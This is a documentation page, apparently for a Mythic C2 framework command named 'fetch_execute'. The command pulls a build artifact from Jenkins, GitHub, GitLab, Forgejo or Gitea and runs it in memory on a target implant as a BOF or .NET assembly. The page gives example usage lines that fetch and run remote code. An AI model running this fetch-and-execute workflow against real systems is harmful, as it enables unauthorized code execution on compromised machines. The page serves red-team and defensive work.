+++
title = "fetch_execute"
chapter = false
weight = 100
hidden = false
+++

## Summary
Fetch a CI/CD build artifact from any supported provider (Jenkins, GitHub Actions, GitLab CI, Forgejo, Gitea) and execute it in-memory on the target callback. Supports BOFs and .NET assemblies.

- Needs Admin: False
- Version: 2
- Author: @Lavender-exe

### Arguments

#### provider

- Description: CI/CD provider to fetch artifacts from
- Required Value: False
- Default Value: jenkins
- Choices: jenkins, github, gitlab, forgejo, gitea

#### job

- Description: Job/workflow name (e.g. loader-c-mingw, build.yml)
- Required Value: True
- Default Value: None

#### build_id

- Description: Build number or run ID (e.g. lastSuccessfulBuild, latest)
- Required Value: False
- Default Value: lastSuccessfulBuild

#### artifact_name

- Description: Specific artifact filename. If empty, auto-selects the first binary artifact
- Required Value: False
- Default Value: None

#### tool_type

- Description: Type of tool to execute in-memory
- Required Value: False
- Default Value: bof
- Choices: bof, assembly

#### bof_args

- Description: Arguments to pass to the BOF (packed format)
- Required Value: False
- Default Value: None

#### assembly_args

- Description: Arguments to pass to the .NET assembly (space-separated)
- Required Value: False
- Default Value: None

#### Provider Credential Parameters

Each provider has optional credential overrides. These override Mythic Secrets and environment variables for that specific invocation:

- `jenkins_url`, `jenkins_user`, `jenkins_token`
- `github_token`, `github_owner`, `github_repo`
- `gitlab_url`, `gitlab_token`, `gitlab_project_id`
- `forgejo_url`, `forgejo_token`, `forgejo_owner`, `forgejo_repo`
- `gitea_url`, `gitea_token`, `gitea_owner`, `gitea_repo`

## Usage

```
fetch_execute -provider jenkins -job loader-c-mingw -build_id lastSuccessfulBuild -tool_type bof
fetch_execute -provider github -job build.yml -build_id latest -tool_type assembly -assembly_args "dump /all"
```

## MITRE ATT&CK Mapping

- T1105 - Ingress Tool Transfer
- T1059 - Command and Scripting Interpreter

## Detailed Summary

The command downloads the artifact from the CI/CD provider, uploads it to Mythic as a temporary file (`DeleteAfterFetch=True`), then delegates execution to the target agent's native BOF or assembly command via Mythic's command augmentation mechanism.

When `artifact_name` is empty and the provider supports artifact listing, the command auto-selects:
1. First artifact with a binary extension (`.exe`, `.dll`, `.bin`, `.o`, `.so`, `.elf`, `.cpl`, `.sys`)
2. First artifact that is not a metadata file (`.sha256`, `.md5`, `.sig`, `.json`, `.txt`, `.log`)
3. First artifact overall

The target agent's native command is looked up from `agent_support.json`. For example, on an Apollo callback with `tool_type=bof`, the task is reprocessed as `execute_coff`.
